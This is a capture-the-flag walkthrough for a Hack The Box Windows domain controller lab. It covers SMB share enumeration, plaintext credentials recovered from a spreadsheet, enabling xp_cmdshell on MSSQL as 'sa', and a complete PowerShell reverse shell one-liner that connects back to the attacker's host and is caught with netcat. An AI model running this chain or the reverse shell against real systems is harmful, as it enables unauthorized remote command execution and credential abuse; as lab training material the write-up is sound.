As is common in real life Windows pentests, you will start this box with credentials for the following account: rose / KxEPkKe6R8su

First I run the nmap scan:
sudo nmap 10.10.11.51  -sC -sV -Pn
```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-21 18:21 EDT
Verbosity Increased to 1.
Completed NSE at 18:23, 40.08s elapsed
Initiating NSE at 18:23
Completed NSE at 18:23, 2.48s elapsed
Initiating NSE at 18:23
Completed NSE at 18:23, 0.00s elapsed
Nmap scan report for 10.10.11.51
Host is up (0.17s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-21 22:22:17Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-21T22:23:40+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
|_SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-21T22:23:40+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
|_SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-21T10:02:59
| Not valid after:  2055-04-21T10:02:59
| MD5:   dcc1:1798:f7a6:2d61:2658:95ec:c8bb:167a
|_SHA-1: 0624:549c:930f:2191:bbd8:b8ab:b755:818b:3db5:2021
|_ssl-date: 2025-04-21T22:23:40+00:00; -2s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
|_SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
|_ssl-date: 2025-04-21T22:23:40+00:00; -2s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-21T22:23:40+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
|_SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-21T22:23:04
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

NSE: Script Post-scanning.
Initiating NSE at 18:23
Completed NSE at 18:23, 0.00s elapsed
Initiating NSE at 18:23
Completed NSE at 18:23, 0.00s elapsed
Initiating NSE at 18:23
Completed NSE at 18:23, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.85 seconds
           Raw packets sent: 1992 (87.648KB) | Rcvd: 18 (792B)      
```

As this is Windows machine we will be mostly focusing on LDAP and File shares or Active Directory Attacks.

We have domain `sequel.htb` for LDAP login. 
## SMB Port enumeration

As we have SMB port open, we use `smbmap` to enumerate the directories recursively
```bash
┌──(truelyyours㉿kali)-[~/EscapeTwo_HTB]
└─$ smbmap -r -H 10.10.11.51 -u rose -p KxEPkKe6R8su

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[+] IP: 10.10.11.51:445	Name: sequel.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Accounting Department                             	READ ONLY	
	./Accounting Department
	dr--r--r--                0 Sun Jun  9 07:11:31 2024	.
	dr--r--r--                0 Sun Jun  9 07:11:31 2024	..
	fr--r--r--            10217 Sun Jun  9 07:11:31 2024	accounting_2024.xlsx
	fr--r--r--             6780 Sun Jun  9 07:11:31 2024	accounts.xlsx
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	./IPC$
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	InitShutdown
	fr--r--r--                5 Sun Dec 31 19:03:58 1600	lsass
	fr--r--r--                4 Sun Dec 31 19:03:58 1600	ntsvcs
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	scerpc
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-388-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	epmapper
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-1d8-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	LSM_API_service
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	eventlog
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-4d8-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	atsvc
	fr--r--r--                4 Sun Dec 31 19:03:58 1600	wkssvc
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-278-0
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-278-1
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-678-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	RpcProxy\49691
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	68bee9719721b258
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	RpcProxy\593
	fr--r--r--                4 Sun Dec 31 19:03:58 1600	srvsvc
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	netdfs
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	tapsrv
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	vgauth-service
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	ROUTER
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-260-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	W32TIME_ALT
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-a98-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	cert
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-a64-0
	fr--r--r--                3 Sun Dec 31 19:03:58 1600	SQLLocal\SQLEXPRESS
	fr--r--r--                2 Sun Dec 31 19:03:58 1600	MSSQL$SQLEXPRESS\sql\query
	fr--r--r--                2 Sun Dec 31 19:03:58 1600	sqlsatellitelaunchSQLEXPRESS
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	msfte\MSSQL15.SQLEXPRESSDf3031d04fd60cf435bf82e8f7b3472ecf7f561iiFTEtoFDAdmin
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	msfte\MSSQL15.SQLEXPRESSDf3031d04fd60cf435bf82e8f7b3472ecf7f561iiFDReq
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	msfte\MSSQL15.SQLEXPRESSDf3031d04fd60cf435bf82e8f7b3472ecf7f561iiCBStatus
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
	fr--r--r--                1 Sun Dec 31 19:03:58 1600	Winsock2\CatalogChangeListener-ae4-0
	NETLOGON                                          	READ ONLY	Logon server share 
	./NETLOGON
	dr--r--r--                0 Sat Jun  8 12:39:53 2024	.
	dr--r--r--                0 Sat Jun  8 12:39:53 2024	..
	SYSVOL                                            	READ ONLY	Logon server share 
	./SYSVOL
	dr--r--r--                0 Sat Jun  8 12:39:53 2024	.
	dr--r--r--                0 Sat Jun  8 12:39:53 2024	..
	dr--r--r--                0 Sat Jun  8 12:39:53 2024	sequel.htb
	Users                                             	READ ONLY	
	./Users
	dw--w--w--                0 Sun Jun  9 09:42:11 2024	.
	dw--w--w--                0 Sun Jun  9 09:42:11 2024	..
	dw--w--w--                0 Sun Jun  9 07:17:29 2024	Default
	fr--r--r--              174 Sat Jun  8 22:27:10 2024	desktop.ini
[|] Closing connections..                                                          [/] Closing connections..                                                          [-] Closing connections..                                                          [*] Closed 1 connections                                      
```
From the top, we have some `.xlsx` files in "Accounting Department", "NETLOGON" and "Users" shared folder let's try to get these files.
## Getting Files
I use `smbclient` to connect to SMB port and get the excel files
```bash
┌──(truelyyours㉿kali)-[~/EscapeTwo_HTB]
└─$ smbclient //10.10.11.51/Accounting\ Department -U rose%KxEPkKe6R8su
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun  9 06:52:21 2024
  ..                                  D        0  Sun Jun  9 06:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 06:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 06:52:07 2024

		6367231 blocks of size 4096. 908430 blocks available
smb: \> get accounting_2024.xlsx 
getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (9.5 KiloBytes/sec) (average 9.5 KiloBytes/sec)
smb: \> get accounts.xlsx 
getting file \accounts.xlsx of size 6780 as accounts.xlsx (19.0 KiloBytes/sec) (average 11.9 KiloBytes/sec)
smb: \> 
```
Now, running the `files` command says that these are zip files. We unzip it and search for ".htb", and we can see that it accounts.
```bash
┌──(truelyyours㉿kali)-[~/EscapeTwo_HTB/AccountingDepartment]
└─$ unzip accounts.xlsx -d accounts
Archive:  accounts.xlsx
file #1:  bad zipfile offset (local header sig):  0
  inflating: accounts/xl/workbook.xml  
  inflating: accounts/xl/theme/theme1.xml  
  inflating: accounts/xl/styles.xml  
  inflating: accounts/xl/worksheets/_rels/sheet1.xml.rels  
  inflating: accounts/xl/worksheets/sheet1.xml  
  inflating: accounts/xl/sharedStrings.xml  
  inflating: accounts/_rels/.rels    
  inflating: accounts/docProps/core.xml  
  inflating: accounts/docProps/app.xml  
  inflating: accounts/docProps/custom.xml  
  inflating: accounts/[Content_Types].xml  

┌──(truelyyours㉿kali)-[~/EscapeTwo_HTB/AccountingDepartment/accounts]
└─$ ls
'[Content_Types].xml'   docProps   _rels   xl

┌──(truelyyours㉿kali)-[~/EscapeTwo_HTB/AccountingDepartment/accounts]
└─$ grep ".htb" ./* -R
./xl/sharedStrings.xml:<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24"><si><t xml:space="preserve">First Name</t></si><si><t xml:space="preserve">Last Name</t></si><si><t xml:space="preserve">Email</t></si><si><t xml:space="preserve">Username</t></si><si><t xml:space="preserve">Password</t></si><si><t xml:space="preserve">Angela</t></si><si><t xml:space="preserve">Martin</t></si><si><t xml:space="preserve">angela@sequel.htb</t></si><si><t xml:space="preserve">angela</t></si><si><t xml:space="preserve">0fwz7Q4mSpurIt99</t></si><si><t xml:space="preserve">Oscar</t></si><si><t xml:space="preserve">Martinez</t></si><si><t xml:space="preserve">oscar@sequel.htb</t></si><si><t xml:space="preserve">oscar</t></si><si><t xml:space="preserve">86LxLBMgEWaKUnBG</t></si><si><t xml:space="preserve">Kevin</t></si><si><t xml:space="preserve">Malone</t></si><si><t xml:space="preserve">kevin@sequel.htb</t></si><si><t xml:space="preserve">kevin</t></si><si><t xml:space="preserve">Md9Wlq1E5bZnVDVo</t></si><si><t xml:space="preserve">NULL</t></si><si><t xml:space="preserve">sa@sequel.htb</t></si><si><t xml:space="preserve">sa</t></si><si><t xml:space="preserve">MSSQLP@ssw0rd!</t></si></sst>
./xl/worksheets/sheet1.xml:<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:xdr="http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing" xmlns:x14="http://schemas.microsoft.com/office/spreadsheetml/2009/9/main" xmlns:xr2="http://schemas.microsoft.com/office/spreadsheetml/2015/revision2" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"><sheetPr filterMode="false"><pageSetUpPr fitToPage="false"/></sheetPr><dimension ref="A1:E5"/><sheetViews><sheetView showFormulas="false" showGridLines="true" showRowColHeaders="true" showZeros="true" rightToLeft="false" tabSelected="true" showOutlineSymbols="true" defaultGridColor="true" view="normal" topLeftCell="A1" colorId="64" zoomScale="100" zoomScaleNormal="100" zoomScalePageLayoutView="100" workbookViewId="0"><selection pane="topLeft" activeCell="B1" activeCellId="0" sqref="B:B"/></sheetView></sheetViews><sheetFormatPr defaultColWidth="11.53515625" defaultRowHeight="12.8" zeroHeight="false" outlineLevelRow="0" outlineLevelCol="0"></sheetFormatPr><cols><col collapsed="false" customWidth="true" hidden="false" outlineLevel="0" max="2" min="2" style="0" width="10.61"/><col collapsed="false" customWidth="true" hidden="false" outlineLevel="0" max="3" min="3" style="0" width="17.15"/><col collapsed="false" customWidth="true" hidden="false" outlineLevel="0" max="4" min="4" style="0" width="10.2"/><col collapsed="false" customWidth="true" hidden="false" outlineLevel="0" max="5" min="5" style="0" width="20.22"/></cols><sheetData><row r="1" customFormat="false" ht="12.8" hidden="false" customHeight="false" outlineLevel="0" collapsed="false"><c r="A1" s="1" t="s"><v>0</v></c><c r="B1" s="1" t="s"><v>1</v></c><c r="C1" s="1" t="s"><v>2</v></c><c r="D1" s="1" t="s"><v>3</v></c><c r="E1" s="1" t="s"><v>4</v></c></row><row r="2" customFormat="false" ht="12.8" hidden="false" customHeight="false" outlineLevel="0" collapsed="false"><c r="A2" s="2" t="s"><v>5</v></c><c r="B2" s="2" t="s"><v>6</v></c><c r="C2" s="3" t="s"><v>7</v></c><c r="D2" s="2" t="s"><v>8</v></c><c r="E2" s="2" t="s"><v>9</v></c></row><row r="3" customFormat="false" ht="12.8" hidden="false" customHeight="false" outlineLevel="0" collapsed="false"><c r="A3" s="2" t="s"><v>10</v></c><c r="B3" s="2" t="s"><v>11</v></c><c r="C3" s="3" t="s"><v>12</v></c><c r="D3" s="2" t="s"><v>13</v></c><c r="E3" s="2" t="s"><v>14</v></c></row><row r="4" customFormat="false" ht="12.8" hidden="false" customHeight="false" outlineLevel="0" collapsed="false"><c r="A4" s="2" t="s"><v>15</v></c><c r="B4" s="2" t="s"><v>16</v></c><c r="C4" s="3" t="s"><v>17</v></c><c r="D4" s="2" t="s"><v>18</v></c><c r="E4" s="2" t="s"><v>19</v></c></row><row r="5" customFormat="false" ht="12.8" hidden="false" customHeight="false" outlineLevel="0" collapsed="false"><c r="A5" s="2" t="s"><v>20</v></c><c r="B5" s="2" t="s"><v>20</v></c><c r="C5" s="3" t="s"><v>21</v></c><c r="D5" s="2" t="s"><v>22</v></c><c r="E5" s="2" t="s"><v>23</v></c></row></sheetData><hyperlinks><hyperlink ref="C2" r:id="rId1" display="angela@sequel.htb"/><hyperlink ref="C3" r:id="rId2" display="oscar@sequel.htb"/><hyperlink ref="C4" r:id="rId3" display="kevin@sequel.htb"/><hyperlink ref="C5" r:id="rId4" display="sa@sequel.htb"/></hyperlinks><printOptions headings="false" gridLines="false" gridLinesSet="true" horizontalCentered="false" verticalCentered="false"/><pageMargins left="0.7875" right="0.7875" top="1.05277777777778" bottom="1.05277777777778" header="0.7875" footer="0.7875"/><pageSetup paperSize="1" scale="100" fitToWidth="1" fitToHeight="1" pageOrder="downThenOver" orientation="portrait" blackAndWhite="false" draft="false" cellComments="none" firstPageNumber="1" useFirstPageNumber="true" horizontalDpi="300" verticalDpi="300" copies="1"/><headerFooter differentFirst="false" differentOddEven="false"><oddHeader>&amp;C&amp;&quot;Times New Roman,Regular&quot;&amp;12&amp;A</oddHeader><oddFooter>&amp;C&amp;&quot;Times New Roman,Regular&quot;&amp;12Page &amp;P</oddFooter></headerFooter></worksheet>
./xl/worksheets/_rels/sheet1.xml.rels:<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:angela@sequel.htb" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:oscar@sequel.htb" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:kevin@sequel.htb" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:sa@sequel.htb" TargetMode="External"/>
```
From this output, I can see there are a bunch of `sequel.htb` accounts. One peculiar account is `sa@sequel.htb` which has a password **MSSQLP@ssw0rd!** in plain string. We can use this password to login into the SQL server.

#TODO NEED TO HAVE THE COMMAND SEPERATE FROM THE OUTPUT
## Login to remote MSSQL server
This is MS-SQL and not MySQL! SQL queries don't exactly work here! :(
I use the `impacket-mssqlclient` to connect to the above account:
```bash
┌──(truelyyours㉿kali)-[~/EscapeTwo_HTB]
└─$ impacket-mssqlclient 'sa:MSSQLP@ssw0rd!@10.10.11.51'    
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)> ls

```
Now, this is MSSQL and not MySQL. We list the databases and look at the tables.
```sql
SQL (sa  dbo@master)> select name from sys.databases;
name     
------   
master   
tempdb   
model    
msdb     
```

Among these tables, `msdb` is an interesting one as it maintains all user related details, services running, permission etc. So, potentially we can exploit it! Let's try.
```sql
SQL (sa  dbo@master)> use msdb;
ENVCHANGE(DATABASE): Old Value: master, New Value: msdb
INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'msdb'.

SQL (sa  dbo@msdb)> EXEC sp_configure 'show advanced options', 1;

INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@msdb)> RECONFIGURE;
SQL (sa  dbo@msdb)> EXEC sp_configure 'xp_cmdshell', 1;

INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@msdb)> RECONFIGURE;
```

Interesting.
So here, I selecte `msdb`  and allow the current user to run `xp_cmdshell` commands so now I can run `powershell` commands from SQL client! Noice! Let's ping to our local client from here.
```sql
SQL (sa  dbo@msdb)> exec xp_cmdshell 'ping 10.10.16.79 -n 10';
^Moutput                                                       
----------------------------------------------------------   
NULL                                                         

Pinging 10.10.16.79 with 32 bytes of data:                   

Reply from 10.10.16.79: bytes=32 time=123ms TTL=63           

Reply from 10.10.16.79: bytes=32 time=42ms TTL=63            

Reply from 10.10.16.79: bytes=32 time=39ms TTL=63            

Reply from 10.10.16.79: bytes=32 time=40ms TTL=63            

Reply from 10.10.16.79: bytes=32 time=41ms TTL=63            

Reply from 10.10.16.79: bytes=32 time=40ms TTL=63            

Reply from 10.10.16.79: bytes=32 time=40ms TTL=63            

Reply from 10.10.16.79: bytes=32 time=147ms TTL=63           

Reply from 10.10.16.79: bytes=32 time=39ms TTL=63            

Reply from 10.10.16.79: bytes=32 time=197ms TTL=63
```

Nice, I can ping my local machine. So now I can just get a reverse shell (`powershell` rather :P) and try to get the flag or do privilege escalation! Hahaahahha!
## Getting reverse `powershell` from the MSSQL 
Attempting to get a reverse `powershell`
```powershell
SQL (sa  dbo@msdb)> exec xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.16.98'',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
```

I simply ask GPT to write me the above command and voila! Below is what I get on my local machine.
```bash
──(truelyyours㉿kali)-[~/linkvortex_htb]
└─$ nc -nvlp 8080
listening on [any] 8080 ...
connect to [10.10.16.79] from (UNKNOWN) [10.10.11.51] 64397

PS C:\Windows\system32>
```

Of course, I have to run a local `nc` server and listen to a particular port.

list users
```powershell
PS C:\> net user

User accounts for \\DC01

-------------------------------------------------------------------------------
Administrator            ca_svc                   Guest                    
krbtgt                   michael                  oscar                    
rose                     ryan                     sql_svc                  
The command completed successfully.
```

